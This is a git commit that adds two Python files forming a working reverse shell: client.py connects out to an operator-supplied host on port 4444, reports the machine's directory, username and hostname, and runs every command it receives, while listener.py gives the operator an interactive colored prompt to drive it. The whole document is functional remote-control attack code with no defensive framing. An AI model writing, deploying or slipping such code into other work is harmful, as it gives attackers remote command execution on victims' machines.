bd82151c53222c408b9c3a558b345b1df59190ea
allpurposebucket <dinostar237@gmail.com>
2023-04-25 13:18:39 -0500

    Initial COmmit

---
+++ client.py
@@ -0,0 +1,38 @@
+import socket
+import os
+import subprocess
+import sys
+import pwd
+
+SERVER_HOST = sys.argv[1]
+SERVER_PORT = 4444
+BUFFER_SIZE = 1024 * 128
+SEPARATOR = "<sep>"
+
+s = socket.socket()
+s.connect((SERVER_HOST, SERVER_PORT))
+
+cwd = os.getcwd()
+hostname = subprocess.getoutput("hostname")
+username = pwd.getpwuid(os.getuid())[0]
+message = f"{cwd}{SEPARATOR}{username}{SEPARATOR}{hostname}"
+s.send(message.encode())
+
+while True:
+    command = s.recv(BUFFER_SIZE).decode()
+    split_command = command.split()
+    if command.lower() == "exit":
+        break
+    if split_command[0].lower() == "cd":
+        try:
+            os.chdir(" ".join(split_command[1:]))
+        except FileNotFoundError as e:
+            output = str(e)
+        else:
+            output = ""
+    else:
+        output = subprocess.getoutput(command)
+    cwd = os.getcwd()
+    message = f"{output}{SEPARATOR}{cwd}"
+    s.send(message.encode())
+s.close()
---
+++ listener.py
@@ -0,0 +1,46 @@
+import socket
+from prettyprinter import cpprint
+
+class bcolors:
+    black = "\u001b[30m"
+    red = "\u001b[31m"
+    green = "\u001b[32m"
+    yellow = "\u001b[33m"
+    blue = "\u001b[34m"
+    magenta = "\u001b[35m"
+    cyan = "\u001b[36m"
+    white = "\u001b[37m"
+    bold = "\u001b[1m"
+    underline = "\u001b[4m"
+    reset = "\u001b[0m"
+
+SERVER_HOST = "0.0.0.0"
+SERVER_PORT = 4444
+BUFFER_SIZE = 1024 * 128
+
+SEPARATOR = "<sep>"
+
+s = socket.socket()
+s.bind((SERVER_HOST, SERVER_PORT))
+s.listen(5)
+print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+
+client_socket, client_address = s.accept()
+print(f"{client_address[0]}:{client_address[1]} Connected!")
+
+message = client_socket.recv(BUFFER_SIZE).decode()
+cwd, username, hostname = message.split(SEPARATOR)
+print("[+] Current working directory:", cwd)
+
+while True:
+    prompt = f"{bcolors.bold}{bcolors.green}{username}@{hostname}{bcolors.white}:{bcolors.blue}{cwd}{bcolors.white}{bcolors.reset}$"
+    command = input(prompt)
+    if not command.strip():
+        continue
+    client_socket.send(command.encode())
+    if command.lower() == "exit":
+        break
+    output = client_socket.recv(BUFFER_SIZE).decode()
+    results, cwd = output.split(SEPARATOR)
+
+    print(results)
